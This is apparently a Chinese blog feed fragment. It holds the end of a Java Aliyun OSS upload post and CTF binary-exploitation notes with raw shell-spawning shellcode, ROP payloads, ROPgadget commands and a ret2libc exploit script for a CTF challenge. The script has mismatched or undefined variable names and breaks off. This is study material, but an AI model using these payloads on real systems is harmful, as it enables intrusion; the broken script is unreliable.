class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OssConfiguration</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span>   <span class="comment">// 交给IOC容器管理</span></span><br><span class="line">    <span class="meta">@ConditionalOnMissingBean</span>   <span class="comment">// 保证Spring容器中只有一个Bean类型的实例</span></span><br><span class="line">    <span class="keyword">public</span> AliOssUtil <span class="title function_">aliOssUtil</span><span class="params">(AliOssProperties aliOssProperties)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;创建阿里云文件上传工具类对象：&#123;&#125;&quot;</span>, aliOssProperties);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AliOssUtil</span>(aliOssProperties.getEndpoint(),</span><br><span class="line">                aliOssProperties.getAccessKeyId(),</span><br><span class="line">                aliOssProperties.getAccessKeySecret(),</span><br><span class="line">                aliOssProperties.getBucketName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AliOssUtil工具类</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AliOssUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String endpoint;</span><br><span class="line">    <span class="keyword">private</span> String accessKeyId;</span><br><span class="line">    <span class="keyword">private</span> String accessKeySecret;</span><br><span class="line">    <span class="keyword">private</span> String bucketName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 文件上传</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bytes</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> objectName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">upload</span><span class="params">(<span class="type">byte</span>[] bytes, String objectName)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建OSSClient实例。</span></span><br><span class="line">        <span class="type">OSS</span> <span class="variable">ossClient</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OSSClientBuilder</span>().build(endpoint, accessKeyId, accessKeySecret);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建PutObject请求。</span></span><br><span class="line">            ossClient.putObject(bucketName, objectName, <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (OSSException oe) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Caught an OSSException, which means your request made it to OSS, &quot;</span></span><br><span class="line">                    + <span class="string">&quot;but was rejected with an error response for some reason.&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;Error Message:&quot;</span> + oe.getErrorMessage());</span><br><span class="line">            System.out.println(<span class="string">&quot;Error Code:&quot;</span> + oe.getErrorCode());</span><br><span class="line">            System.out.println(<span class="string">&quot;Request ID:&quot;</span> + oe.getRequestId());</span><br><span class="line">            System.out.println(<span class="string">&quot;Host ID:&quot;</span> + oe.getHostId());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClientException ce) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Caught an ClientException, which means the client encountered &quot;</span></span><br><span class="line">                    + <span class="string">&quot;a serious internal problem while trying to communicate with OSS, &quot;</span></span><br><span class="line">                    + <span class="string">&quot;such as not being able to access the network.&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;Error Message:&quot;</span> + ce.getMessage());</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (ossClient != <span class="literal">null</span>) &#123;</span><br><span class="line">                ossClient.shutdown();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//文件访问路径规则 https://BucketName.Endpoint/ObjectName</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;https://&quot;</span>);</span><br><span class="line">        stringBuilder</span><br><span class="line">                .append(bucketName)</span><br><span class="line">                .append(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">                .append(endpoint)</span><br><span class="line">                .append(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">                .append(objectName);</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">&quot;文件上传到:&#123;&#125;&quot;</span>, stringBuilder.toString());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> stringBuilder.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AliOssProperties从配置文件中读取</span></span><br><span class="line"><span class="meta">@Component</span><span class="comment">// 标注一个类为Spring容器的Bean</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;sky.alioss&quot;)</span> <span class="comment">// // 将属性绑定到控制范围之外的第三方组件</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AliOssProperties</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String endpoint;</span><br><span class="line">    <span class="keyword">private</span> String accessKeyId;</span><br><span class="line">    <span class="keyword">private</span> String accessKeySecret;</span><br><span class="line">    <span class="keyword">private</span> String bucketName;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="事务管理"><a href="#事务管理" class="headerlink" title="事务管理"></a>事务管理</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;web前端&quot;&gt;&lt;a href=&quot;#web前端&quot; class=&quot;headerlink&quot; title=&quot;web前端&quot;&gt;&lt;/a&gt;web前端&lt;/h1&gt;&lt;h2 id=&quot;HTML&quot;&gt;&lt;a href=&quot;#HTML&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    <category term="web" scheme="https://1xueyu1.github.io/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>CTF</title>
    <link href="https://1xueyu1.github.io/2024/03/15/CTF/"/>
    <id>https://1xueyu1.github.io/2024/03/15/CTF/</id>
    <published>2024-03-15T13:34:12.000Z</published>
    <updated>2024-05-26T15:30:27.629Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="1-IDA基础操作"><a href="#1-IDA基础操作" class="headerlink" title="1.IDA基础操作"></a>1.IDA基础操作</h2><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="二进制基础知识"><a href="#二进制基础知识" class="headerlink" title="二进制基础知识"></a>二进制基础知识</h2><h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h3><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fprintf</span><span class="params">(FILE *stream, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">dprintf</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">snprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br></pre></td></tr></table></figure><h4 id="转换指示符"><a href="#转换指示符" class="headerlink" title="转换指示符"></a>转换指示符</h4><table><thead><tr><th>字符</th><th>类型</th><th>使用</th></tr></thead><tbody><tr><td>d</td><td>4-byte</td><td>Integer</td></tr><tr><td>u</td><td>4-byte</td><td>Unsigned Integer</td></tr><tr><td>x</td><td>4-byte</td><td>Hex</td></tr><tr><td>s</td><td>4-byte ptr</td><td>String</td></tr><tr><td>c</td><td>1-byte</td><td>Character</td></tr></tbody></table><h4 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h4><table><thead><tr><th>字符</th><th>类型</th><th>使用</th></tr></thead><tbody><tr><td>hh</td><td>1-byte</td><td>char</td></tr><tr><td>h</td><td>2-byte</td><td>short int</td></tr><tr><td>l</td><td>4-byte</td><td>long int</td></tr><tr><td>ll</td><td>8-byte</td><td>long long int</td></tr></tbody></table><h2 id="二进制安全属性"><a href="#二进制安全属性" class="headerlink" title="二进制安全属性"></a>二进制安全属性</h2><h3 id="symbol"><a href="#symbol" class="headerlink" title="symbol"></a>symbol</h3><p>在编译期间，某些 *符号(symbols)*包含在二进制文件中，这些符号主要用作于调试。开发软件时，需要用到这些符号，来调试和修复错误。</p><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p>Canary 是放置在缓冲区和 <em>栈(stack)</em> 上的控制数据之间的已知值，它用于监视缓冲区是否溢出。</p><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>*位置无关可执行文件(Position-Independent Executable)*（PIE），顾名思义，它指的是放置在内存中某处执行的代码，不管其绝对地址的位置，即代码段、数据段地址随机化（ASLR）</p><h3 id="4、NX"><a href="#4、NX" class="headerlink" title="4、NX"></a><strong>4、NX</strong></h3><p>NX 代表 *不可执行(non-executable)*。它通常在 CPU 层面上启用，因此启用 NX 的操作系统可以将某些内存区域标记为不可执行。通常，缓冲区溢出漏洞将恶意代码放在堆栈上，然后尝试执行它。但是，让堆栈这些可写区域变得不可执行，可以防止这种攻击。</p><h3 id="5、RELRO（GOT-写保护）"><a href="#5、RELRO（GOT-写保护）" class="headerlink" title="5、RELRO（GOT 写保护）"></a><strong>5、RELRO（GOT 写保护）</strong></h3><p>RELRO 代表 “*重定位只读(Relocation Read-Only)*”。可执行链接格式（ELF）二进制文件使用全局偏移表（GOT）来动态地解析函数。启用 RELRO 后，会设置二进制文件中的 GOT 表为只读，从而防止重定位攻击：</p><h2 id="栈对齐"><a href="#栈对齐" class="headerlink" title="栈对齐"></a>栈对齐</h2><p><a href="https://zhuanlan.zhihu.com/p/611961995">CTFer成长日记12：栈对齐—获取shell前的临门一脚 - 知乎 (zhihu.com)</a></p><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>通过 gdb 查看 bss 段可执行，所以把只要把内容写到这个地方，然后返回地址跳转到 bss 段就可以执行 shellcode</p><h3 id="生成shell代码"><a href="#生成shell代码" class="headerlink" title="生成shell代码"></a>生成shell代码</h3><p><strong>使用shellcraft生成的默认是44字节</strong></p><p><code>shellcode = asm(shellcraft.sh())</code></p><h3 id="短字节shellcode"><a href="#短字节shellcode" class="headerlink" title="短字节shellcode"></a>短字节shellcode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">32 位 短字节 shellcode -&gt; 21 字节</span><br><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br><span class="line"></span><br><span class="line">64 位 较短的 shellcode 23 字节</span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f</span><br><span class="line">\x05</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>如果buf长度不够容纳，可以截断分两次执行</strong></p><h3 id="可见字符shellcode"><a href="#可见字符shellcode" class="headerlink" title="可见字符shellcode"></a>可见字符shellcode</h3><h4 id="使用-alpha3-master"><a href="#使用-alpha3-master" class="headerlink" title="使用 alpha3-master"></a>使用 alpha3-master</h4><h4 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure><h4 id="x32"><a href="#x32" class="headerlink" title="x32"></a>x32</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA</span><br></pre></td></tr></table></figure><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="32位程序"><a href="#32位程序" class="headerlink" title="32位程序"></a>32位程序</h3><p>参数利用栈来传递，所以调用system函数时要把参数放入栈中</p><h3 id="64位程序"><a href="#64位程序" class="headerlink" title="64位程序"></a>64位程序</h3><p><strong>优先利用寄存器传递参数（rdi, rsi, rdx, rcx, r8, r9）</strong></p><h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p><strong>Linux 的系统调用通过 int 80h 实现</strong>，用系统调用号来区分入口函数</p><p><strong>应用程序调用系统调用的过程是：</strong></p><p>1、把<strong>系统调用的编号存入 EAX</strong></p><p>2、把<strong>函数参数存入其它通用寄存器</strong></p><p>3、<strong>触发 0x80 号中断</strong>（int 0x80）</p><p>那么我们如果希望通过系统调用来获取 shell 就需要把系统调用的参数放入各个寄存器，然后执行 int 0x80 就可以了</p><h4 id="e-g"><a href="#e-g" class="headerlink" title="e.g."></a>e.g.</h4><p>如果说想通过系统调用执行的是：<code> execve(&quot;/bin/sh&quot;,NULL,NULL)</code>（32位程序）</p><p>那么 eax 寄存器应该放系统调用号，查看 execve 的系统调用号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/include/asm/unistd_32.h | grep execve </span><br></pre></td></tr></table></figure><p>所以现在需要做的就是让：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">eax=0xb</span><br><span class="line"></span><br><span class="line">ebx=/bin/sh 的地址</span><br><span class="line"></span><br><span class="line">ecx=0</span><br><span class="line"></span><br><span class="line">edx=0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用命令找到 pop eax：<code> ROPgadget --binary rop  --only &#39;pop|ret&#39; | grep &#39;eax&#39;</code></p><p>同时使用：<code>ROPgadget --binary rop --string &#39;/bin/sh&#39;</code> 找到 ‘&#x2F;bin&#x2F;sh’ 字符串在什么地方</p><p>以及需要的 int 0x80：<code>ROPgadget --binary rop --only &#39;int&#39;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_other_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_addr)+p32(int_addr)</span><br><span class="line"><span class="comment"># 先填充垃圾数据，然后放入pop_eax_ret的地址，跳转过去执行pop_eax，所以下一个填需要赋值给eax的0xb，接着ret到pop_edx_ecx_ebx的地方，将参数放入，最后ret到int函数地址进行调用系统函数</span></span><br></pre></td></tr></table></figure><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>直接生成调用函数的代码</p><p><strong>使用ropper和ROPgadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ropper --file inndy_rop --chain execveropper --file inndy_rop --chein exceve// 直接生成实现exceve函数的代码</span><br><span class="line"></span><br><span class="line">ROPgadget --binary inndy_rop --ropchain</span><br></pre></td></tr></table></figure><h3 id="PLT-GOT"><a href="#PLT-GOT" class="headerlink" title="PLT&amp;GOT"></a>PLT&amp;GOT</h3><p>linux下的动态链接是通过PLT&amp;GOT来实现的，这里做一个实验，通过这个实验来理解</p><p>使用如下源代码 test.c：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void print_banner()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Welcome to World of PLT and GOT\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    print_banner();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依次使用下列命令进行编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -g -o test.o -c test.c -m32</span><br><span class="line">gcc -o test test.o -m32</span><br></pre></td></tr></table></figure><p>这样除了原有的 test.c 还有个 test.o 以及可执行文件 test</p><p>通过 <code>objdump -d test.o</code> 可以查看反汇编</p><p>通过 <code>objdump -d test &gt; test.asm</code> 可以看到其中 plt 表项有三条指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">080482d0 &lt;common@plt&gt;:</span><br><span class="line"> // 一个公共参数？</span><br><span class="line"> 80482d0:ff 35 04 a0 04 08    pushl  0x804a004</span><br><span class="line"> // 跳转到_dl_runtime_resolve函数</span><br><span class="line"> 80482d6:ff 25 08 a0 04 08    jmp    *0x804a008</span><br><span class="line"> 80482dc:00 00                add    %al,(%eax)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">080482e0 &lt;puts@plt&gt;:</span><br><span class="line"> // 第一个是跳转到got表指向的地址，绑定后就存放动态链接库中对应的函数地址</span><br><span class="line"> 80482e0:ff 25 0c a0 04 08    jmp    *0x804a00c</span><br><span class="line"> // 第二个是系统函数的标号，作为_dl_runtime_resolve函数的参数</span><br><span class="line"> 80482e6:68 00 00 00 00       push   $0x0</span><br><span class="line"> // 第三个都相同，common@plt 的地址</span><br><span class="line"> 80482eb:e9 e0 ff ff ff       jmp    80482d0 &lt;_init+0x28&gt;</span><br><span class="line"></span><br><span class="line">080482f0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80482f0:ff 25 10 a0 04 08    jmp    *0x804a010</span><br><span class="line"> 80482f6:68 08 00 00 00       push   $0x8</span><br><span class="line"> 80482fb:e9 d0 ff ff ff       jmp    80482d0 &lt;_init+0x28&gt;</span><br></pre></td></tr></table></figure><p>ps.这里 plt 表的第一项使用 objdump 的时候给没有符号名的一项自动改成了离他最近的一项，为了避免引起误会，改成了 common，而且随着不断深入，会发现，确实可以叫 common</p><p>其中除第一个表项以外，plt 表的第一条都是跳转到对应的 got 表项，而 got 表项的内容我们可以通过 gdb 来看一下，如果函数还没有执行的时候，这里的地址是对应 plt 表项的下一条命令，即 push 0x0</p><h3 id="system-0-函数"><a href="#system-0-函数" class="headerlink" title="system($0)函数"></a>system(<code>$0</code>)函数</h3><p>知识点：可以利用<code>system($0)</code>获得shell权限，<code>$0</code>在机器码中为 <code>\x24\x30</code></p><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p><a href="https://blog.csdn.net/weixin_45943522/article/details/120469196">pwn小白入门06–ret2libc-CSDN博客</a></p><p><code>shift + F12</code>字符串窗口</p><p><code>gdb</code>中使用<code>vmmap</code>查看可读可写区域</p><h3 id="e-g-2021-鹤城杯-babyof-NSSCTF"><a href="#e-g-2021-鹤城杯-babyof-NSSCTF" class="headerlink" title="e.g.[2021 鹤城杯]babyof | NSSCTF"></a>e.g.[<a href="https://www.nssctf.cn/problem/469">2021 鹤城杯]babyof | NSSCTF</a></h3><p>前言<br>64位Linux和32位Linux确乎有着关于参数传递上的不同，然而无论哪种，关于ret2libc这一题型。如果仅仅是wiki上的三道题目，那还是远远不够的。故尝试通过本题，总结ret2libc的一般过程。</p><p>过程包括通过puts&#x2F;write来泄露got表中的puts&#x2F;write的真实地址-&gt;计算libc的基址-&gt;libc基址+任意库函数相对于libc的偏移量&#x3D;任意函数真实地址-&gt;libc基址+libc中’&#x2F;bin&#x2F;sh’偏移量&#x3D;’&#x2F;bin&#x2F;sh’地址，如此构造system(‘&#x2F;bin&#x2F;sh’)</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./babyof&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyof&#x27;</span>)</span><br><span class="line">puts_plt = <span class="number">0x400520</span></span><br><span class="line"><span class="comment"># 因为64位使用寄存器传参（rdi, rsi, rdx, rcx, r8, r9）</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x400743</span></span><br><span class="line">main_addr = <span class="number">0x40066b</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">72</span>)</span><br><span class="line"><span class="comment"># 将puts_got的地址pop到rdi中</span></span><br><span class="line">payload1 += p64(pop_rdi_ret_addr) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="comment"># 第一次溢出返回到puts</span></span><br><span class="line">payload1 += p64(puts_plt)</span><br><span class="line"><span class="comment"># puts返回地址到main</span></span><br><span class="line">payload1 += p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;overflow?\n&#x27;</span>, payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;win\n&#x27;</span>)</span><br><span class="line">puts_real_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#一个地址的最高位的两个字节是00，而且实际栈地址一般是0x7fxxxx开头的，因此为了避免获取错误的地址值，只需要获取前面的6字节值，然后通过ljust函数把最高位的两字节填充成00。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================================================之所以称为ret2libc：=======================================================</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_real_addr)         <span class="comment">#LibcSearcher,通过函数名和函数真实地址来找到对应的libc（之后会做选择，选择正确的那个即可） </span></span><br><span class="line">libc_addr=puts_real_addr-libc.dump(<span class="string">&quot;puts&quot;</span>)       <span class="comment">#libc的真实的基址=puts的真实地址-puts相对于libc基址的偏移量</span></span><br><span class="line">bin_sh_addr=libc_addr+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)    <span class="comment">#&#x27;/bin/sh&#x27;的真实地址=libc基址的真实地址+&#x27;/bin/sh&#x27;相对于libc基址的偏移量</span></span><br><span class="line">system_real_addr=libc_addr+libc.dump(<span class="string">&quot;system&quot;</span>)   <span class="comment">#system函数的真实地址=libc基址的真实地址+system函数相对于libc基址的偏移量</span></span><br><span class="line"><span class="comment">#===============================================================================================================================</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">8</span>)            <span class="comment">#栈溢出</span></span><br><span class="line">payload2+=p64(ret)                <span class="comment">#因为system被调用时，其中有一个汇编指令，要求栈顶16字节对齐，否则会出错。需要栈能够调整其高度，就可以通过ret+ret+…+addr的方式。这样首先是调整了输入的个数（满足栈顶对齐的要求），其次ret到下一个ret,反复执行实则是“空转”，相当于pop了当前的栈元素，不起到任何其他作用。最后还是跳到了addr的位置。</span></span><br><span class="line">payload2+=p64(pop_ret_rdi_addr)+p64(bin_sh_addr)<span class="comment">#system函数的参数准备，即把&#x27;/bin/sh&#x27;（的地址）传入 </span></span><br><span class="line">payload2+=p64(system_real_addr)   <span class="comment">#调用system</span></span><br><span class="line">payload2+=p64(main_addr)          <span class="comment"># 给一个返回地址，不要也行</span></span><br><span class="line"> </span><br><span class="line">io.sendlineafter(<span class="string">&quot;overflow?\n&quot;</span>,payload2)         <span class="comment">#栈溢出点发送payload</span></span><br><span class="line">io.recv()                         <span class="comment">#吸收一下发过来的数据，没必要</span></span><br><span class="line">io.interactive()                  <span class="comment">#开始交互，ls -&gt; cat flag</span></span><br><span 